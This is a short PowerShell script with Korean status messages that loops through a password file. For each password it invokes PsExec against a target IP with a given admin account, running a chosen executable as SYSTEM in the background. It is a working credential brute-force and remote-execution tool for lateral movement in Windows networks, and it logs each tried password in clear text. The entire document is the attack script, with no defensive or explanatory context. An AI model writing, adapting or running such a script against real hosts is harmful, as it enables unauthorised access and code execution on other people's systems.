param(
    [string]$TargetIP,
    [string]$PasswordFile,
    [string]$AdminID,
    [string]$PsExecPath,
    [string]$RemoteExecPath
)

Write-Host "`n[*] run_psexec_loop.ps1 시작 - Target IP: $TargetIP / AdminID: $AdminID / PasswordFile: $PasswordFile"

if (-not (Test-Path -Path $PasswordFile)) {
    Write-Error "Password file not found: $PasswordFile"
    exit 1
}

$passwords = Get-Content -Path $PasswordFile -Encoding UTF8
Write-Host "[*] 비밀번호 $($passwords.Count)개 읽음."

foreach ($pw in $passwords) {
    if (-not [string]::IsNullOrWhiteSpace($pw)) {
        Write-Host "`n[*] PsExec 시도 - Target: $TargetIP / User: $AdminID / PW: $pw"
        
        # PsExec 실행
        & $PsExecPath "\\$TargetIP" -u $AdminID -p "$pw" -n 20 -accepteula -s -d $RemoteExecPath

        # 1초 대기
        Start-Sleep -Seconds 1
    }
}

Write-Host "`n[*] run_psexec_loop.ps1 종료."
